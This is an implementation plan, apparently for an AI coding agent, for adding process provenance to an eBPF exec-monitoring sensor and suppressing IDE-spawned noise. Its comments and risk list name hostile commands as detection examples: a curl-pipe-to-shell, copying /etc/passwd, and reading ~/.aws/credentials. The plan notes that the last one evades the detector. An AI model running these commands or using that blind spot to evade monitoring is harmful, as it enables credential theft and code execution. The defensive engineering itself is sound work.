# task_struct Provenance + Noise Reduction Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Capture per-process provenance (pid/ppid/comm/parent_comm) from `task_struct` in the eBPF sensor, thread it end-to-end through the pipeline, and use it to drop the IDE git-polling flood at the source — while killing the stale HIGH false positives.

**Architecture:** The sensor already reads `task_struct` for the tty only. We extend `struct event` with `pid`, `ppid`, `comm` (pre-exec acting name), and `pcomm` (parent name), read them with `BPF_CORE_READ`/`bpf_get_current_comm`, and propagate them through `model.Event` → scorer `ExecEvent`/`Verdict` → exectrace `types.Verdict` → the React feed. The scorer then drops *benign* execs whose immediate parent is a known editor/IDE process (VSCode git polling, language servers), which is what floods the feed. Risky commands are never suppressed, so a compromised editor extension still surfaces. The web feed additionally collapses consecutive identical rows into one with a `×N` count as a general safety net.

**Tech Stack:** C (libbpf/CO-RE, bpf2go), Go 1.x (3 modules: root sensor, `scorer/`, `exectrace/`), React + TypeScript + Vite, SQLite (history), Docker (privileged, host PID ns) for the Linux build/run.

## Global Constraints

- **Branch:** all work on `ebpf-implementation` (per established workflow), NOT `main`. Auto-commit + push after each working step. No Claude co-author trailer.
- **Verdict JSON contract is duplicated in three places and MUST stay JSON-compatible:** `scorer/verdict.go` (`Verdict`), `exectrace/internal/types/types.go` (`Verdict`), `exectrace/web/src/lib/types.ts` (`Verdict`). Any field added to one for UI display must be added to all three. New fields use `,omitempty` (Go) / optional `?` (TS) so minimal/replayed events still round-trip.
- **Event JSON contract between sensor and scorer:** `internal/model/event.go` (producer) JSON tags MUST match `scorer/event.go` `Envelope`+`ExecEvent` (consumer). Provenance tags are fixed: `pid`, `ppid`, `comm`, `parent_comm`.
- **eBPF cannot be built or run on macOS.** All `go generate` (bpf2go), sensor build, and live verification run inside the Docker container (`docker-compose.yaml`, privileged, `pid: host`). Go unit tests (decode, prefilter, suppression) and the TS build run on the host.
- **TASK_COMM_LEN = 16** — `comm`/`pcomm` are truncated to 15 chars + NUL by the kernel. Suppression names must match within that limit (`code-insiders` = 13 ✓).
- **bpf2go bindings (`cmd/execguard/bpf_bpfel.go`, `.o`) are NOT committed** (`.gitignore`d; only `decode.go`/`generate.go`/`main.go` are tracked). They are regenerated by `make generate` in the container. Field names map Go-idiomatically: C `pid`→`Pid`, `ppid`→`Ppid`, `comm`→`Comm`, `pcomm`→`Pcomm`.

```go
package main

// isEditorNoise reports whether an exec is routine editor/IDE housekeeping that
// floods the feed (VSCode git polling, language servers). It matches when the
// acting OR parent process name is in parents.
//
// Safety: looksRisky-positive commands are NEVER suppressed, so a compromised
// editor extension (e.g. `bash -c "curl x | sh"` spawned by code) still reaches
// the model. We only drop commands that would otherwise resolve benign anyway.
// An empty parents map disables suppression entirely.
func isEditorNoise(e ExecEvent, parents map[string]bool) bool {
	if len(parents) == 0 {
		return false
	}
	if looksRisky(e) {
		return false
	}
	return parents[e.Comm] || parents[e.ParentComm]
}

// parseNameSet splits a comma-separated flag into a set of process names.
func parseNameSet(s string) map[string]bool {
	set := map[string]bool{}
	for _, p := range splitCSV(s) {
		set[p] = true
	}
	return set
}
```

If a CSV splitter doesn't already exist in the scorer package, add it here (the sensor's `parseExcludes` lives in a different module, so it can't be reused):

```go
import "strings"

func splitCSV(s string) []string {
	var out []string
	for _, p := range strings.Split(s, ",") {
		if p = strings.TrimSpace(p); p != "" {
			out = append(out, p)
		}
	}
	return out
}
```

## Problems & Risks discovered (advisory, per your request)

1. **Generated bpf2go bindings aren't committed.** Only `decode.go`/`generate.go`/`main.go` are tracked; `bpf_bpfel.go`/`.o` are regenerated by `make generate`, which needs clang + llvm + libelf + `vmlinux.h` and a Linux kernel with BTF. **All Phase 1 build/test runs happen in the Docker container, never on macOS.** Plan tasks reflect this.

2. **The Verdict contract is triplicated** (`scorer/verdict.go`, `exectrace/internal/types/types.go`, `web/src/lib/types.ts`) and already drifts slightly (the scorer struct has `latency_ms`; the exectrace struct doesn't — it survives only because JSON ignores unknown fields). Every display field must be added in all three. The plan does this; future fields must too. Consider consolidating later.

3. **SQLite history won't show provenance.** `exectrace/internal/store/store.go` persists a fixed 10-column schema; provenance flows over the **live websocket** (which serializes the full `types.Verdict`) but the `/api/verdicts` history endpoint won't carry `parent_comm`. Acceptable for the live console. If history must show it, add columns + migrate `INSERT`/`SELECT` — out of scope here.

4. **`comm` at `sys_enter_execve` is the PRE-exec name, by design.** The forked child still carries the spawner's name before the image is replaced, which is exactly why it's useful for provenance (a VSCode poll reads `comm="node"`/`"code"`, not `"git"`). Do not "fix" it to read the new binary name. Document this so it survives future edits. Names are clipped to 15 chars (`TASK_COMM_LEN`).

5. **`MAX_ARG_LEN = 128` silently truncates long arg strings.** Long IDE command lines get clipped mid-arg. `ExecEvent` has `ArgvTruncated`/`ArgClipped` fields but `decode.go` never sets them, so truncation is invisible. This is the most likely culprit if a `bash -c "<long git cmd>"` slips past `isBenignShellWrapper` (the program token survives at the front, so it usually doesn't — but verify in Phase 5 Step 4). Out of scope to fix; flagged.

6. **Suppression is a deliberate detection blind spot — mitigated, not eliminated.** Dropping editor-spawned execs means a malicious payload run by a compromised VSCode extension is invisible *if it looks benign*. We gate on `looksRisky`, so anything with a downloader, pipe-to-shell, temp-exec, or sensitive path still reaches the model. Residual risk: a benign-looking-but-malicious command (e.g. `cp /etc/passwd /tmp/x` is caught by `looksRisky`; `cat ~/.aws/credentials` is **not** in `riskySubstrings`). Consider widening `riskySubstrings` if this matters for the demo.

7. **`--tty-only` already exists, is opt-in, and is unused** (docker-compose runs `sleep infinity`, not the sensor). Parent-comm suppression is the more robust successor for IDE noise; tty-emptiness still uniquely catches *daemon/cron* noise. They're complementary — keep both. Whoever produced the screenshot ran the sensor manually; the new `pipeline` Makefile target makes it reproducible.

8. **The screenshot's HIGH false positives are almost certainly a stale build** predating commits `74b9de0`/`d0a8278` (the git + bash-wrapper prefilter). The mix of `0.95` and `0.02` bash rows confirms it. Phase 5's rebuild is the test of this hypothesis; Phase 5 Step 4 handles the case where it's a real gap instead.

9. **Branch state:** repo is currently on `main`; your workflow expects `ebpf-implementation`. Create/switch before Task 1 (`git checkout ebpf-implementation` or `git checkout -b ebpf-implementation`).
